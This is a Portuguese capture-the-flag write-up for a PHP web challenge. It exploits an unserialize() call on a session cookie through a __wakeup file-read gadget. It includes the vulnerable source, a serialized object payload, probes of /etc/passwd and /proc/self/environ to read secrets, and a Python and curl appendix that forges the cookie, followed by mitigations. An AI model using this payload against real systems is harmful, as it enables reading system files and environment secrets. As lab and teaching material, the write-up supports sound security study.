<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Reprise+de+Session" alt="Typing SVG" /></a>

</div>

# Reprise de Session — WEB · 🟣 EXTREMO

- **Status:** ✅ RESOLVIDO — leitura arbitrária de arquivo via POP gadget em `__wakeup`, flag lida de `/proc/self/environ`.
- **Pontos:** 250
- **Anexo / Alvo:** `src_compte_42.zip` (fonte PHP) · `https://reprise-de-session.cyberzerk.fr/`
- **Enunciado:** *"Les sessions sont des objets PHP sérialisés dans le cookie session. Source fournie. Lisez le flag du serveur."*
- **Flag:** `CyberZerk{PHP_uns3r1al1z3_p0p_ch41n_v14_w4k3up}`

---

## TL;DR

1. O cookie `session` é `base64(serialize(objeto))` e o servidor roda `unserialize()` nesse valor controlado pelo usuário → **PHP Object Injection**.
2. A classe `Template` tem um gadget POP: `__wakeup()` executa `file_get_contents($this->path)` e o `echo` devolve o conteúdo. Controlando `$path`, viramos a "sessão" numa **leitura de arquivo arbitrária**.
3. A flag não está em disco: é a env var `FLAG=`. Lida via `/proc/self/environ`.

## Análise

### A fonte (`index.php`)

```php
class Template {
    public $path = 'templates/welcome.html';
    public $content = '';
    public function __wakeup() { $this->content = @file_get_contents($this->path); }
}
$c = $_COOKIE['session'] ?? '';
$o = @unserialize(base64_decode($c));   // BUG: dado controlado
if ($o instanceof Template) { echo $o->content; }
```

`__wakeup()` é um *magic method*: o PHP o executa **automaticamente** na desserialização, antes de qualquer validação. Como `$path` vem do cookie, o atacante escolhe o arquivo lido. Não há injeção de código — é POP (Property-Oriented Programming): abusa de um método legítimo já existente.

### O payload

Objeto `Template` com `path` apontando pro alvo, serializado e em base64:

```php
O:8:"Template":2:{s:4:"path";s:N:"<caminho>";s:7:"content";s:0:"";}
```

### Confirmando a primitiva

`path = /etc/passwd` → a resposta devolve o arquivo inteiro. Leitura arbitrária **confirmada** (logo, sem `open_basedir`). O `/etc/passwd` ainda revelou o usuário `player` (home `/home/player`).

### Localizando a flag

- `path = /flag.txt`, `/home/player/flag.txt` → `<pre>` vazio (não existem).
- `path = index.php` (relativo) → vazio: o cwd do worker php-fpm é `/`, não o docroot, então vira `/index.php`.
- **`path = /proc/self/environ`** → despeja o ambiente do processo, incluindo `PWD=/app` (docroot real) e, direto, `FLAG=CyberZerk{...}`.

`/proc/self/environ` usa `\0` como separador; basta `tr '\0' '\n'` na resposta.

## O que não funcionou

| Hipótese | Resultado | Por quê |
|---|---|---|
| `CyberZerk{decoy-7f0e177bd9ec}` (comentário no `index.php` + zero-width no `README.txt`) | ✗ | Isca; a mesma string `7f0e177bd9ec` escondida pra queimar tentativa |
| Porta `:8080` do `CONNEXION.txt` | ✗ | Porta interna atrás do proxy; acesso público é HTTPS :443 |
| `/flag.txt`, `/home/player/flag.txt` | ✗ | Flag não é arquivo em disco |
| `index.php` relativo | ✗ | cwd do php-fpm = `/`, não o docroot |

## Conclusão

Fechou lendo a env var via `/proc/self/environ`. O enunciado "lisez le flag du serveur" era literal: a primitiva certa (leitura de arquivo) + o alvo certo (`/proc/self/environ` em vez de caçar caminhos de flag). O nome da flag resume a cadeia: `PHP_uns3r1al1z3_p0p_ch41n_v14_w4k3up`.

### Mitigação

- Nunca `unserialize()` entrada controlada pelo usuário. Preferir formatos de dados (JSON) + validação; se precisar, `unserialize($x, ['allowed_classes'=>false])`.
- Autenticar/assinar o cookie de sessão (HMAC) para que o conteúdo não seja forjável.

---

## Apêndice — gerar o cookie

```bash
python3 - <<'PY'
import base64
p="/proc/self/environ"
s=f'O:8:"Template":2:{{s:4:"path";s:{len(p.encode())}:"{p}";s:7:"content";s:0:"";}}'
print(base64.b64encode(s.encode()).decode())
PY
# curl -s https://reprise-de-session.cyberzerk.fr/ -b "session=<base64>" | tr '\0' '\n'
```
